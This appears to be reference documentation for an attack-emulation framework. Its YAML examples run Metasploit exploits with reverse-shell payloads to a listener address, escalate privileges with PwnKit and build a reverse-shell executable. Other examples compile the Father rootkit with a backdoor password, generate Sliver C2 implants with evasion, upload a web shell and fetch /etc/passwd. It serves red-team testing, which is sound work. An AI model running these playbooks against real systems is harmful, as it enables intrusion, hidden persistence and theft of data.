+   :required: ``True``
+
+
+.. confval:: cmd
+
+   The value of the variable
+
+   :type: str
+   :required: ``True``
+
+.. confval:: encoder
+
+   If encoder is set, the command in cmd will be encoded before stored in ``variable``.
+   Please note that if encoding fails, this command will fallback to plain cmd and will
+   print out a warning.
+
+   .. code-block:: yaml
+
+      commands:
+        - type: setvar
+          variable: TEST
+          cmd: Hello World
+          encoder: base64-encoder
+
+        - type: debug
+          cmd: $TEST
+
+        - type: setvar
+          variable: TEST
+          cmd: $TEST
+          encoder: base64-decoder
+
+        - type: debug
+          cmd: $TEST
+
+        - type: setvar
+          variable: TEST
+          cmd: $TEST
+          encoder: rot13
+
+        - type: debug
+          cmd: $TEST
+
+        - type: setvar
+          variable: TEST
+          cmd: $TEST
+          encoder: rot13
+
+        - type: debug
+          cmd: $TEST
+
+        - type: setvar
+          variable: TEST
+          cmd: $TEST
+          encoder: urlencoder
+
+        - type: debug
+          cmd: $TEST
+
+        - type: setvar
+          variable: TEST
+          cmd: $TEST
+          encoder: urldecoder
+
+        - type: debug
+          cmd: $TEST
+
+        - type: setvar
+          variable: TEST
+          cmd: $TEST
+          encoder: base64-decoder
+
+        - type: debug
+          cmd: $TEST
+
+   :type: str['base64-encoder', 'base64-decoder', 'rot13', 'urlencoder', 'urldecoder']
+
+----------------------------
+
+playbook/commands/httpclient.rst
+file content ...
+
+===========
+http-client
+===========
+
+Execute HTTP-requests like curl does. This command also supports HTTP/2
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: http-client
+       url: https://www.google.com
+       http2: True
+
+     - type: http-client
+       cmd: POST
+       url: https://api.myapp.tld
+       useragent: "Mozilla Firefox 1/337"
+       headers:
+         "X-AUTH-TOKEN": "sometoken"
+       cookies:
+         mycookie: "cookie-value"
+       data:
+         view: edit
+         id: 10
+
+     - type: http-client
+       cmd: PUT
+       url: https://api.myapp.tld/dav
+       local_path: /tmp/webshell.php
+
+
+
+.. confval:: cmd
+
+   The HTTP-Method to use. Supported methods are:
+
+   * GET
+   * POST
+   * PUT
+   * DELETE
+   * PATCH
+   * HEAD
+   * OPTIONS
+
+   :type: str
+   :default: ``GET``
+
+.. confval:: url
+
+   Address of the target website.
+
+   :type: str
+   :required: ``True``
+
+.. confval:: output_headers
+
+   Store headers in the output.
+
+   :type: str
+   :default: ``False``
+
+.. confval:: headers
+
+   Include these extra headers in the request when sending HTTP to a server.
+
+   :type: dict[str,str]
+
+.. confval:: cookies
+
+   Pass the data to the HTTP server in the Cookie header.
+
+   :type: dict[str,str]
+
+.. confval:: data
+
+   Sends  the specified data in a POST request to the HTTP server, in the same
+   way that a browser does when a user has filled in an HTML form and presses
+   the submit button.
+
+   :type: dict[str,str]
+
+.. confval:: local_path
+
+   Load content from the given file and send it via HTTP. This is useful for
+   dav uploads.
+
+   :type: str
+
+.. confval:: useragent
+
+   Change the user-agent string.
+
+   :type: str
+   :default: ``AttackMate``
+
+.. confval:: follow
+
+   Automatically follow redirects
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: verify
+
+   This option makes attackmate skip the secure connection verification step and proceed without checking.
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: http2
+
+   Try to use HTTP version 2. AttackMate will negotiate the HTTP version with the server and use HTTP2 if possible.
+
+   :type: bool
+   :default: ``False``
+
+----------------------------
+
+playbook/commands/json.rst
+file content ...
+
+====
+json
+====
+
+Parse variables from a JSON file or from a variable (for example, ``RESULT_STDOUT``) that contains a valid JSON string.
+If the "local_path" option is used, the JSON is read directly from the specified file. The "cmd" option is optional. If "local_path" is defined, the "cmd" option will be ignored.
+If no "local_path" is set, the JSON is read from the "cmd" option. The variables are recursively parsed from the JSON input and saved in the variable store.
+The variables are recursively parsed from the json input and are saved as single variables in the variable store.
+Variable names are generated by concatenating keys at each level using an underscore (_) as a separator.
+If the lowest-level value is a list of primitives (e.g., strings, integers), the list is preserved as-is without further flattening.
+
+Example
+-------
+
+Given the following JSON input:
+
+.. code-block:: json
+
+    {
+      "first_list": [1, 2, 3],
+      "user": {
+        "name": "John Doe",
+        "age": 30,
+        "address": {
+          "street": "123 Main St",
+          "city": "New York",
+          "postal_codes": [10001, 10002]
+        },
+        "friends": [
+          {
+            "name": "Jane Smith",
+            "age": 28,
+            "address": {
+              "street": "456 Oak Rd",
+              "city": "Los Angeles",
+              "postal_codes": [90001, 90002]
+            }
+          },
+          {
+            "name": "Emily Davis",
+            "age": 35,
+            "address": {
+              "street": "789 Pine Ln",
+              "city": "Chicago",
+              "postal_codes": [60007, 60008]
+            }
+          }
+        ]
+      }
+    }
+
+The variables would be saved in the variable store as follows:
+
+.. code-block:: yaml
+
+    first_list: [1, 2, 3]
+    user_name: "John Doe"
+    user_age: 30
+    user_address_street: "123 Main St"
+    user_address_city: "New York"
+    user_address_postal_codes: [10001, 10002, 10003]
+    user_friends_0_name: "Jane Smith"
+    user_friends_0_age: 28
+    user_friends_0_address_street: "456 Oak Rd"
+    user_friends_0_address_city: "Los Angeles"
+    user_friends_0_address_postal_codes: [90001, 90002]
+    user_friends_1_name: "Emily Davis"
+    user_friends_1_age: 35
+    user_friends_1_address_street: "789 Pine Ln"
+    user_friends_1_address_city: "Chicago"
+    user_friends_1_address_postal_codes: [60007, 60008]
+
+Configuration
+-------------
+
+.. confval:: local_path
+
+   The JSON input to parse from. Valid input is a path to a JSON file. If "local_path" is set, the "cmd" option will be ignored.
+
+   :type: str
+   :required: False
+
+.. confval:: cmd
+
+   The JSON input to parse from. Valid input is a variable name from the variable store (without the leading ``$``) that contains a valid JSON string.
+
+   :type: str
+   :required: False
+
+   Either ``local_path`` OR ``cmd`` is required.
+
+.. confval:: varstore
+
+   If set to ``True``, logs the variable store before and after adding variables using the JSON command.
+
+   :type: bool
+   :required: False
+
+Examples
+--------
+
+.. code-block:: yaml
+
+    commands:
+      - type: json
+        local_path: "/path/to/samplefile.json"
+        varstore: True
+      - type: shell
+        cmd: |
+          cat <<EOF
+          {
+            "name": "Whiskers",
+            "favorite_toys": ["ball", "feather", "laser pointer"]
+          }
+          EOF
+      - type: json
+        cmd: RESULT_STDOUT
+        use_var: True
+
+----------------------------
+
+playbook/commands/msf-session.rst
+file content ...
+
+.. _msf-session:
+
+===========
+msf-session
+===========
+
+This command allows to read and write commands to (Meterpreter)sessions that
+have previously created by msf-modules(see :ref:`msf-module`).
+
+.. code-block:: yaml
+
+      commands:
+        - type: msf-module
+           cmd: exploit/unix/webapp/zoneminder_snapshots
+           creates_session: "foothold"
+           options:
+             RHOSTS: 192.42.0.254
+           payload_options:
+             LHOST: 192.42.2.253
+           payload: cmd/unix/python/meterpreter/reverse_tcp
+
+        - type: msf-session
+          session: "foothold"
+          stdapi: True
+          cmd: getuid
+
+.. note::
+
+   To configure the connection to the msfrpc-server see :ref:`msf_config`
+
+.. confval:: stdapi
+
+   Load stdapi module in the Meterpreter-session.
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: write
+
+   Execute a raw write-operation without reading the output.
+
+   .. note::
+
+      If read and write are both true, the programm will first write and then read.
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: read
+
+   Execute a raw read-operation without a write-operation.
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: session
+
+   Use this session for all operations.
+
+   :type: str
+   :required: True
+
+.. confval:: end_str
+
+   This string indicated the end of a read-operation.
+
+   :type: str
+
+----------------------------
+
+playbook/commands/loop.rst
+file content ...
+
+====
+loop
+====
+
+Execute a set of commands in a loop, based on a condition or iteration over a list of values.
+
+The `loop` command allows dynamic iteration over lists or ranges of values, executing a sequence of commands for each iteration. It provides flexibility when working with variable data such as network scans, enabling the execution of different commands depending on the results, without prior knowledge of the number of iterations.
+
+.. note::
+
+   The loop command works with two primary loop conditions: iterating over a list of values (`items`) or iterating over a numerical range (`range`).
+
+.. code-block:: yaml
+
+   vars:
+     LISTA:
+       - one
+       - two
+
+   commands:
+     - type: loop
+       cmd: "items(LISTA)"
+       commands:
+         - type: shell
+           cmd: echo hello
+         - type: debug
+           cmd: $LOOP_ITEM
+
+     - type: loop
+       cmd: "range(0, 3)"
+       commands:
+         - type: shell
+           cmd: echo "Index $LOOP_INDEX"
+         - type: debug
+           cmd: $LOOP_INDEX
+
+**Loop with items**:
+This mode iterates over the elements of a list and substitutes each element into the commands.
+The current item is accessible as the `$LOOP_ITEM` variable.
+
+**Loop with range**:
+This mode iterates over a range of integers. The current index is accessible as the `$LOOP_INDEX` variable.
+
+**Loop until condition is fulfilled**
+This mode iterates indefinitely until the condition is fulfilled. (Checked before every command within the loop)
+Variables in cmd settings of an until loop command until($VAR1 == $VAR2) will be substituted from the variable store on every iteration of the loop.
+The current index/iteration of the loop is also accessible as the `$LOOP_INDEX` variable for the until() condition.
+
+.. confval:: cmd
+
+   The loop condition. This defines how the loop should iterate, either over a list or a range of values, or idefinitely until the
+   condition defined in until() is rached.
+
+   :type: str
+   :required: ``True``
+
+   Examples:
+
+   - **items(LISTA)**: Iterate over the elements of a list named `LISTA`.
+   - **range(0, 10)**: Iterate over a range from 0 to 9.
+   - **until($PORT == 7)
+
+.. confval:: break_if
+
+   If defined, this condition is checked before every command in the loop.
+   If the condition evaluates to `True`, break out of the loop.
+   Supports the same operators as :confval:`only_if`.
+
+   :type: str
+   :required: ``False``
+
+.. confval:: commands
+
+   The list of commands to execute during each iteration of the loop. These commands are executed once per iteration, with loop-specific variables (`$LOOP_ITEM` or `$LOOP_INDEX`) available for substitution.
+
+   :type: list[Command]
+   :required: ``True``
+
+   .. code-block:: yaml
+
+      vars:
+        LISTA:
+          - port1
+          - port2
+
+      commands:
+        - type: loop
+          cmd: "items(LISTA)"
+          commands:
+            - type: shell
+              cmd: "nmap -p $LOOP_ITEM 10.10.10.10"
+            - type: debug
+              cmd: $LOOP_ITEM
+
+   In the above example, each element of `LISTA` (port1, port2) is substituted into the loop, and an Nmap scan is run for each port.
+
+   Example of looping over a range:
+
+   .. code-block:: yaml
+
+      vars:
+        INDEX_START: 0
+        INDEX_END: 5
+
+      commands:
+        - type: loop
+          cmd: "range($INDEX_START, $INDEX_END)"
+          commands:
+            - type: shell
+              cmd: echo "Index is $LOOP_INDEX"
+
+.. confval:: LOOP_ITEM
+
+   In `items` loops, this variable holds the current item from the list being iterated over.
+
+   :type: str
+
+.. confval:: LOOP_INDEX
+
+   In `range` loops, this variable holds the current index of the iteration.
+
+   :type: int
+
+----------------------------
+
+playbook/commands/payload.rst
+file content ...
+
+===========
+msf-payload
+===========
+
+Generate metasploit payloads and save the payload to a file.
+
+.. code-block:: yaml
+
+   - type: msf-payload
+     cmd: windows/meterpreter/reverse_tcp
+     format: exe
+     payload_options:
+       LHOST: 192.168.100.1
+       LPORT: 1111
+     local_path: /tmp/payload.exe
+
+   - type: shell
+     cmd: cat $LAST_MSF_PAYLOAD
+
+.. confval:: cmd
+
+   The payload to generate.
+
+   :type: str
+   :required: ``True``
+
+.. confval:: format
+
+   Generate the payload in this format. See metasploit documentation to find out the supported formats
+
+   :type: str
+   :default: ``raw``
+
+.. confval:: payload_options
+
+   Typical payload_options are LHOST or LPORT for reverse shells. Dict(key/values) of payload options.
+
+   :type: Dict[str,str]
+
+.. confval:: local_path
+
+   Copy the payload to this local path.
+   If not set, the payload will be saved in a temporary path.
+
+   :type: str
+
+.. confval:: badchars
+
+   Characters to avoid example: '\x00\xff'
+
+   :type: str
+
+.. confval:: force_encode
+
+   Force encoding
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: encoder
+
+   The encoder to use. ``msfvenom --list  encoders`` to list
+
+   :type: str
+
+.. confval:: template
+
+   Specify a custom executable file to use as a template
+
+   :type: str(path)
+
+.. confval:: platform
+
+   The platform for the payload. ``msfvenom --list platforms`` to list
+
+   :type: str
+
+.. confval:: keep_template_working
+
+   Preserve the template behaviour and inject the payload as a new thread
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: nopsled_size
+
+   Prepend a nopsled of [length] size on to the payload
+
+   :type: int
+   :default: ``0``
+
+.. confval:: iter
+
+   The number of times to encode the payload
+
+   :type: int
+   :default: ``0``
+
+----------------------------
+
+playbook/commands/msf-module.rst
+file content ...
+
+.. _msf-module:
+
+==========
+msf-module
+==========
+
+This command executes Metasploit-Modules via Metasploits RPC-Api.
+
+.. note::
+
+   To configure the connection to the msfrpc-server see :ref:`msf_config`
+
+Some Metasploit-Modules return output. Like the Auxilary-Modules:
+
+.. code-block:: yaml
+
+   commands:
+     - type: msf-module
+       cmd: auxiliary/scanner/portscan/tcp
+       options:
+         RHOSTS: 192.42.0.254
+
+Most Exploit-Modules don't create output but instead they create
+sessions(see :ref:`msf-session`)
+
+.. code-block:: yaml
+
+   commands:
+     - type: msf-module
+        cmd: exploit/unix/webapp/zoneminder_snapshots
+        creates_session: "foothold"
+        options:
+          RHOSTS: 192.42.0.254
+        payload_options:
+          LHOST: 192.42.2.253
+        payload: cmd/unix/python/meterpreter/reverse_tcp
+
+.. confval:: cmd
+
+   This option stores the path to the metasploit-module.
+
+   :type: str
+
+   .. note::
+
+     Please note that the path includes the module-type.
+
+
+.. confval:: target
+
+   This option sets the payload target for the metasploit-module.
+
+   :type: int
+   :default: ``0``
+
+.. confval:: creates_session
+
+   A session name that identifies the session that is created by
+   the module. This session-name can be used by :ref:`msf-session`
+
+   :type: str
+
+.. confval:: session
+
+   This option is set in exploit['SESSION']. Some modules(post-modules)
+   need a session to be executed with.
+
+   :type: str
+
+.. confval:: payload
+
+   Path to a payload for this module.
+
+   :type: str
+
+   The following example illustrates the use of sessions and payloads:
+
+   .. code-block:: yaml
+
+      commands:
+        - type: msf-module
+           cmd: exploit/unix/webapp/zoneminder_snapshots
+           creates_session: "foothold"
+           options:
+             RHOSTS: 192.42.0.254
+           payload_options:
+             LHOST: 192.42.2.253
+           payload: cmd/unix/python/meterpreter/reverse_tcp
+
+         - type: msf-module
+           cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+           session: "foothold"
+           creates_session: "root"
+           options:
+             WRITABLE_DIR: "/tmp"
+           payload_options:
+             LHOST: 192.42.2.253
+             LPORT: 4455
+           payload: linux/x64/shell/reverse_tcp
+
+.. confval:: options
+
+   Dict(key/values) of module options, like RHOSTS:
+
+   :type: Dict[str,str]
+
+.. confval:: payload_options
+
+   Dict(key/values) of payload options, like LHOST and LPORT:
+
+   :type: Dict[str,str]
+
+----------------------------
+
+playbook/commands/mktemp.rst
+file content ...
+
+======
+mktemp
+======
+
+Create temporary files or directories that are deleted when the programm exits.
+The path to the file or directory is storen in a given variable.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: mktemp
+       cmd: file
+       variable: SOMEFILE
+
+     - type: debug
+       cmd: "$SOMEFILE"
+
+     - type: mktemp
+       cmd: dir
+       variable: TEMPDIR
+
+     - type: debug
+       cmd: "$TEMPDIR"
+
+
+.. confval:: cmd
+
+   Define if a file or directory will be created. Valid
+   options are: *file* or *dir*.
+
+   :type: str
+   :default: ``file``
+
+
+.. confval:: variable
+
+   This setting defines a variable where the path of the
+   temporary file or directory will be stored.
+
+   :type: str
+   :required: ``True``
+
+----------------------------
+
+playbook/commands/sftp.rst
+file content ...
+
+====
+sftp
+====
+
+Upload or download files using SSH. This command is
+also executed by the SSHExecutor and therefor all
+ssh-related settings can be used. SSH-sessions can also
+be used with the sftp-command!
+
+.. note::
+
+   This command caches all the settings so
+   that they only need to be defined once.
+
+.. code-block:: yaml
+
+   vars:
+     $SERVER_ADDRESS: 192.42.0.254
+     $SSH_SERVER: 10.10.10.19
+
+   commands:
+     - type: sftp
+       cmd: put
+       local_path: /tmp/linpeas.sh
+       remote_path: /tmp/linpeas.sh
+       hostname: $SSH_SERVER
+       username: aecid
+       key_filename: "/home/alice/.ssh/id_rsa"
+       creates_session: "attacker"
+
+     # cached ssh-settings. creates new ssh-connection
+     - type: sftp
+       cmd: get
+       remote_path: /etc/passwd
+       local_path: /tmp/remote_passwd
+
+     # reuses existing session "attacker"
+     - type: ssh
+       session: "attacker"
+       cmd: "id"
+
+.. confval:: cmd
+
+   SFTP-command to use. Valid commands are *put* or *get*.
+
+   :type: str
+   :required: ``True``
+
+.. confval:: remote_path
+
+   The filepath on the remote machine.
+
+   :type: str
+   :required: ``True``
+
+.. confval:: local_path
+
+   The filepath on the local machine.
+
+   :type: str
+   :required: ``True``
+
+.. confval:: mode
+
+   The file permissions on the remote file(e.g. *755*).
+
+   :type: str
+
+
+.. confval:: hostname
+
+   This option sets the hostname or ip-address of the
+   remote ssh-server.
+
+   :type: str
+
+.. confval:: port
+
+   Port to connect to on the remote host.
+
+   :type: int
+   :default: ``22``
+
+.. confval:: username
+
+   Specifies the user to log in as on the remote machine.
+
+   :type: str
+
+.. confval:: password
+
+   Specifies the password to use. An alternative would be to use a key_file.
+
+   :type: str
+
+.. confval:: passphrase
+
+   Use this passphrase to decrypt the key_file. This is only necessary if the
+   keyfile is protected by a passphrase.
+
+   :type: str
+
+.. confval:: key_filename
+
+   Path to the keyfile.
+
+   :type: str
+
+.. confval:: timeout
+
+   The timeout to drop a connection attempt in seconds.
+
+   :type: float
+
+.. confval:: clear_cache
+
+   Normally all settings for ssh-connections are cached. This allows to defined
+   all settings in one command and all following commands can reuse these settings
+   without set them in every single command. If a new connection with different
+   settings should be configured, this setting allows to reset the cache to default
+   values.
+
+   :type: bool
+   :default: ``False``
+
+   .. note::
+
+       This setting will not clear the session store.
+
+.. confval:: creates_session
+
+   A session name that identifies the session that is created when
+   executing this command. This session-name can be used by using the
+   option "session"
+
+   :type: str
+
+.. confval:: session
+
+   Reuse an existing ssh-session. This setting works only if another
+   ssh-command was executed with the command-option "creates_session"
+
+   :type: str
+
+.. confval:: jmp_hostname
+
+   This option sets the hostname or ip-address of the
+   remote jump server.
+
+   :type: str
+
+.. confval:: jmp_port
+
+   Port to connect to on the jump-host.
+
+   :type: int
+   :default: ``22``
+
+.. confval:: jmp_username
+
+   Specifies the user to log in as on the jmp-host.
+
+   :type: str
+   :default: ``same as username``
+
+----------------------------
+
+playbook/commands/sleep.rst
+file content ...
+
+=====
+sleep
+=====
+
+Sleep a certain amount of seconds.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sleep
+       seconds: 60
+
+
+.. confval:: min_sec
+
+   This option defines the minimum seconds to sleep. This
+   is only relevant if option **random** is set to True
+
+   :type: int
+   :default: ``0``
+
+
+.. confval:: seconds
+
+   This options sets the seconds to sleep. If the option
+   **random** is set to True, this option is the maximum time
+   to sleep.
+
+   :type: int
+   :default: ``1``
+   :required: True
+
+
+.. confval:: random
+
+  This option allows to randomize the seconds to wait. The minimum
+  and maximum seconds for the range can be set by **min_sec** and
+  **seconds**.
+
+
+  :type: bool
+  :default: ``False``
+
+
+  The following example will take a random amount of seconds between 30 seconds
+  and 60 seconds:
+
+  .. code-block:: yaml
+
+     ###
+     commands:
+       - type: sleep
+         seconds: 60
+         min_sec: 30
+         random: True
+
+
+.. confval:: cmd
+
+  This option is ignored
+
+  :type: str
+  :default: ``sleep``
+
+----------------------------
+
+playbook/commands/father.rst
+file content ...
+
+======
+father
+======
+
+The Fahter LD_PRELOAD rootkit requires to compile the config settings into the binary.
+This command compiles the binary and stores the path in the variable ``LAST_FATHER_PATH``.
+If ``local_path`` is not defined, the command will create a temporary directory and copy
+the sources into the directory before compiling the rootkit.
+
+Father can be found at `this GitHub-Page <https://github.com/mav8557/Father>`_
+
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: father
+       cmd: generate
+       hiddenport: 2222
+       shell_pass: "superpass"
+       env_var: "norkt"
+
+     - type: debug
+       cmd: ""
+       varstore: True
+     # {'LAST_FATHER_PATH': '/tmp/tmpuou9rb0a/Father/rk.so', 'RESULT_STDOUT': 'Saved to /tmp/tmpuou9rb0a/Father/rk.so', 'RESULT_RETURNCODE': '0'}
+
+.. confval:: gid
+
+   The group id under which the rootkit will operate. All processes of this gid will be hidden.
+
+   :type: int
+   :default: ``1337``
+
+.. confval:: srcport
+
+   The magic port number that allows to connect to the accept-backdoor of father.
+
+   :type: int
+   :default: ``54321``
+
+.. confval:: epochtime
+
+   Time for timebomb() to go off, in seconds since 1970-01-01
+
+   :type: int
+   :default: ``0000000000``
+
+.. confval:: env_var
+
+   Magic environment variable for Local Privilege Escalation (LPE). If this environment
+   variable is set, it is possible to escalate privileges using *sudo* or *gpasswd*
+
+   :type: str
+   :default: ``lobster``
+
+.. confval:: file_prefix
+
+   Magic prefix for hidden files.
+
+   :type: str
+   :default: ``lobster``
+
+.. confval:: preload_file
+
+   Hide this preload file(hide the rootkit)
+
+   :type: str
+   :default: ``ld.so.preload``
+
+.. confval:: hiddenport
+
+   Port to remove from netstat output, etc
+
+   :type: str(hex)
+   :default: ``D431``
+
+.. confval:: shell_pass
+
+   Password for accept() backdoor shell
+
+   :type: str
+   :default: ``lobster``
+
+.. confval:: install_path
+
+   Location of rootkit on disk
+
+   :type: str
+   :default: ``/lib/selinux.so.3``
+
+.. confval:: local_path
+
+   Copy the rootkit to this local path before compiling it.
+   If not set, the builder will generate a temporary path.
+
+   :type: str
+
+.. confval:: arch
+
+   Target arch to compile the rootkit to. Currently only amd64
+   is supported.
+
+   :type: str
+   :default: ``amd64``
+
+.. confval:: build_command
+
+   Use this command to build the rootkit. This setting might be useful
+   for compiling the rootkit in a chroot-environment.
+
+   :type: str
+   :default: ``make``
+
+----------------------------
+
+playbook/commands/regex.rst
+file content ...
+
+=====
+regex
+=====
+
+This command parses variables using regular expressions. For more information
+about regular expressions see `Python Regex  <https://docs.python.org/3/library/re.html>`_
+
+The following example parses the portnumber from the output of the last command and stores it in variable "UNREALPORT":
+
+.. code-block:: yaml
+
+   commands:
+     - type: shell
+       cmd: echo "6667/tcp open  irc UnrealIRCd"
+
+     - type: regex
+       cmd: (\d+).*UnrealIRCd
+       output:
+           UNREALPORT: "$MATCH_0"
+
+     - type: debug
+       cmd: "Port: $UNREALPORT"
+
+
+By using the mode "split", strings that are seperated by whitespaces can be tokenized:
+
+.. code-block:: yaml
+
+   commands:
+     - type: shell
+       cmd: echo "6667/tcp open  irc UnrealIRCd"
+
+     - type: regex
+       cmd: "\ +"
+       mode: split
+       output:
+           # {'MATCH_0': '6667/tcp', 'MATCH_1': 'open', 'MATCH_2': 'irc', 'MATCH_3': 'UnrealIRCd\n'}
+           UNREALPORT: "$MATCH_0"
+
+     - type: debug
+       cmd: "Port: $UNREALPORT"
+
+.. confval:: mode
+
+   Specifies the python regex-function. One of: ``search``, ``split``, ``sub`` or ``findall``.
+
+   :type: str
+   :default: ``findall``
+
+.. confval:: replace
+
+   This variable must be set for sub mode. It holds the replacement-string for the substitution.
+
+   :type: str
+   :default: ``None``
+
+   .. code-block:: yaml
+
+      commands:
+        - type: setvar
+          cmd: "hello world"
+          variable: FOO
+
+        - type: regex
+          cmd: hello
+          replace: whaat
+          mode: sub
+          input: FOO
+          output:
+            BAR: $MATCH_0
+
+        - type: debug
+          cmd: $BAR
+
+
+.. confval:: input
+
+   Parse the value of this variable.
+
+   :type: str
+   :default: ``RESULT_STDOUT``
+
+.. confval:: output
+
+   Defines where to store the results of the regular expression. This
+   must be a list of key-value pairs("variable-name": "$MATCH"). The matches
+   of the regular expressions are stored in temporary variables $MATCH. If the
+   match is stored in a list or in a list of tuples the variablename will be
+   numbered by the index. For example: "$MATCH_0_0" for the first element in the
+   first occurance. The first match (even if there is only one) is indexed MATCH_0.
+   If the regex-command does not match, no output variable will be set!
+   Note that if sub() or split() do not have a match the input string is returned.
+   Additionally, ``REGEX_MATCHES_LIST`` is set every time a regex command yields matches and it contains a list of all matches.
+
+
+   .. note::
+
+       A dump containing all matches will be printed if attackmate runs in debug-mode.
+
+   :type: dict[str,str]
+   :required: True
+
+----------------------------
+
+playbook/commands/sliver.rst
+file content ...
+
+.. _sliver:
+
+======
+sliver
+======
+
+There are multiple commands from type 'sliver' to controll the sliver-server via API.
+
+start_https_listener
+--------------------
+
+Start an HTTPS-Listener
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver
+       cmd: start_https_listener
+       host: 0.0.0.0
+       port: 443
+
+
+.. confval:: host
+
+   Interface to bind server to.
+
+   :type: str
+   :default: ``0.0.0.0``
+
+.. confval:: port
+
+   TCP-Listen port
+
+   :type: int
+   :default: ``443``
+
+.. confval:: domain
+
+   Limit responses to specific domain
+
+   :type: str
+   :default: `` ``
+
+.. confval:: website
+
+   Website name
+
+   :type: str
+   :default: `` ``
+
+.. confval:: acme
+
+   Attempt to provision a let's encrypt certificate
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: persistent
+
+   Make persistent across restarts.
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: enforce_otp
+
+   Enable or disable OTP authentication
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: randomize_jarm
+
+   Enable randomized Jarm fingerprints
+
+   :type: bool
+   :default: ``True``
+
+.. confval:: long_poll_timeout
+
+   Server-Side long poll timeout(in seconds)
+
+   :type: int
+   :default: ``1``
+
+.. confval:: long_poll_jitter
+
+   Server-Side long poll jitter(in seconds)
+
+   :type: int
+   :default: ``2``
+
+.. confval:: timeout
+
+   Command timeout in seconds.
+
+   :type: int
+   :default: ``60``
+
+
+generate_implant
+----------------
+
+Generates a new sliver binary and saves the implant to a given path or to /tmp/<name>.
+The path to the implant is saved and can be retrieved from the variable store as $LAST_SLIVER_IMPLANT.
+
+.. code-block:: yaml
+
+   ###
+   commands:
+     - type: sliver
+       cmd: generate_implant
+       c2url: "https://myC2url.com"
+       name: "linux_implant"
+       target: linux/amd64
+       filepath: /path/to/implant/my_implant
+
+
+.. confval:: target
+
+   Compile the binary for the given operatingsystem to the given architecture. The
+   following targets are supported:
+
+   * darwin/amd64
+   * darwin/arm64
+   * linux/386
+   * linux/amd64
+   * windows/386
+   * windows/amd64
+
+   :type: str
+   :default: ``linux/amd64``
+
+.. confval:: c2url
+
+   Url which is used by the implant to find the C2 server.
+
+   :type: str
+   :required: True
+
+.. confval:: format
+
+   Specifies the output format for the implant. Valid formats are:
+
+   * EXECUTABLE
+   * SERVICE
+   * SHARED_LIB
+   * SHELLCODE
+
+   :type: str
+   :default: ``EXECUTABLE``
+
+.. confval:: name
+
+   Name of the implant.
+   This name is the session used by the attackmate command 'sliver-session'.
+
+   :type: str
+   :required: True
+
+.. confval:: filepath
+
+   The local filepath to save the implant to. If none is given the implant is saved in /tmp.
+   The <name> will be random and have the format ^tmp[a-z0-9]{8}$.
+
+
+   :type: str
+   :default: ``/tmp/<name>``
+
+.. confval:: IsBeacon
+
+   Generate a beacon binary
+
+   :type: bool
+   :default: False
+
+.. confval:: RunAtLoad
+
+   Run the implant entrypoint from DllMain/Constructor(shared library only)
+
+   :type: bool
+   :default: ``False``
+
+.. confval:: Evasion
+
+   Enable evasion features (e.g. overwrite user space hooks)
+
+   :type: bool
+   :default: ``False``
+
+   :type: bool
+   :default: False
+
+----------------------------
+
+playbook/commands/ssh.rst
+file content ...
+
+===
+ssh
+===
+
+Execute commands on a remote server via SSH.
+
+.. note::
+
+   This command caches all the settings so
+   that they only need to be defined once.
+
+.. code-block:: yaml
+
+   vars:
+     $SERVER_ADDRESS: 192.42.0.254
+     $SSH_SERVER: 10.10.10.19
+
+   commands:
+     # creates new ssh-connection and session
+     - type: ssh
+       cmd: nmap $SERVER_ADDRESS
+       hostname: $SSH_SERVER
+       username: aecid
+       key_filename: "/home/alice/.ssh/id_rsa"
+       creates_session: "attacker"
+
+     # cached ssh-settings. creates new ssh-connection
+     - type: ssh
+       cmd: "echo $SERVER_ADDRESS"
+
+     # reuses existing session "attacker"
+     - type: ssh
+       session: "attacker"
+       cmd: "id"
+
+.. confval:: hostname
+
+   This option sets the hostname or ip-address of the
+   remote ssh-server.
+
+   :type: str
+
+.. confval:: port
+
+   Port to connect to on the remote host.
+
+   :type: int
+   :default: ``22``
+
+.. confval:: username
+
+   Specifies the user to log in as on the remote machine.
+
+   :type: str
+
+.. confval:: password
+
+   Specifies the password to use. An alternative would be to use a key_file.
+
+   :type: str
+
+.. confval:: passphrase
+
+   Use this passphrase to decrypt the key_file. This is only necessary if the
+   keyfile is protected by a passphrase.
+
+   :type: str
+
+.. confval:: key_filename
+
+   Path to the keyfile.
+
+   :type: str
+
+
+.. confval:: timeout
+
+   The timeout to drop a connection attempt in seconds.
+
+   :type: float
+
+.. confval:: clear_cache
+
+   Normally all settings for ssh-connections are cached. This allows to defined
+   all settings in one command and all following commands can reuse these settings
+   without set them in every single command. If a new connection with different
+   settings should be configured, this setting allows to reset the cache to default
+   values.
+
+   :type: bool
+   :default: ``False``
+
+   .. note::
+
+       This setting will not clear the session store.
+
+.. confval:: creates_session
+
+   A session name that identifies the session that is created when
+   executing this command. This session-name can be used by using the
+   option "session"
+
+   :type: str
+
+.. confval:: session
+
+   Reuse an existing ssh-session. This setting works only if another
+   ssh-command was executed with the command-option "creates_session"
+
+   :type: str
+
+.. confval:: jmp_hostname
+
+   This option sets the hostname or ip-address of the
+   remote jump server.
+
+   :type: str
+
+.. confval:: jmp_port
+
+   Port to connect to on the jump-host.
+
+   :type: int
+   :default: ``22``
+
+.. confval:: jmp_username
+
+   Specifies the user to log in as on the jmp-host.
+
+   :type: str
+   :default: ``same as username``
+
+.. confval:: interactive
+
+   When the ssh-command is executed, the command will block until the ssh-execution finishes.
+   However, for some exploits it is necessary to run a command and send keystrokes to an
+   interactive session. For example run with the first command "vim" and with the second command
+   send keystrokes to the open vim-session. In interactive-mode the command will try reading the
+   output until no output is written for a certain amount of seconds. If the output ends with any
+   string found in ``prompts``, it will stop immediately.
+
+   .. warning::
+
+      Please note that you **MUST** send a newline when you execute a ssh-command interactively.
+
+   :type: bool
+   :default: ``False``
+
+   .. code-block:: yaml
